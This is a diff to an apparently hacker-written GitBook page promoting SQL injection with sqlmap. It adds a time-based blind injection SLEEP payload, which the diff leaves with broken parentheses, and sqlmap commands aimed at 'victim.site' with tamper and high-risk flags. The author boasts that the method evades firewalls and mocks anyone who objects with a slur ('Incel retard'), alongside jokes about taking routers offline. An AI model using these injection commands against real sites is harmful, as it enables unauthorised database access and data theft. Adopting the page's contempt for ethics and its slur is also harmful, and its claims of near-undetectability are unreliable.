@@ -2,7 +2,11 @@
 
 <figure><img src=".gitbook/assets/image.png" alt=""><figcaption><p>Picture of SQLmap</p></figcaption></figure>
 
+CYANIDE: "We pwn databases and slay all the data 🤫🤫✨&#x20;
 
+Incel retard: "Nooo we cannot do that its unethical"&#x20;
+
+CYANIDE: "Router offline?? LULZZ😴😴"
 
 {% embed url="https://cdn.discordapp.com/attachments/1156957811977228459/1226571709541515304/Desktop_2024.04.07_-_18.34.48.02_1.mp4?ex=662e7b6c&hm=d15fe05473cde344efcfb107bfd375d2aeeb9a4e3a790a3c636f6b20e7c03047&is=661c066c" %}
 Example of me (**Cyanide/H3ll0k1tty**) getting databse accesss doing SqlMAP INJECTIONZZZ in Base64 Encoding (u can use my theory below to do this as well lolz lolz lolz)
@@ -28,11 +32,16 @@ If we look closely we can see that and IF statement is being used we can make th
 
 
 ```
-(SELECT(SLEEP(10 - ((NOT(NOT(16=16)) AND 0) AND (NOT(TRUE) AND 10)))))
+(SELECT(SLEEP(10 - ((NOT(NOT(16=16)) AND 0) AND (NOT(TRUE) AND 10))))
 ```
 
-\
+```markdown
+Here are some extra tings to remeber,...
+- **H4ck1ng SQL 101**: `sqlmap -u "victim.site" --tampers=space2comment` for that sneaky attazck 
+- **S3cr3t Modes Activate**: Add `--level=5 --risk=3` to go full beast mode on that database
 
+
+```
 
 so my pro sophisticated method is as pure as a computer can come because of logical.. making it almost impossible for firewalls or other security to detect the attempts.&#x20;
 
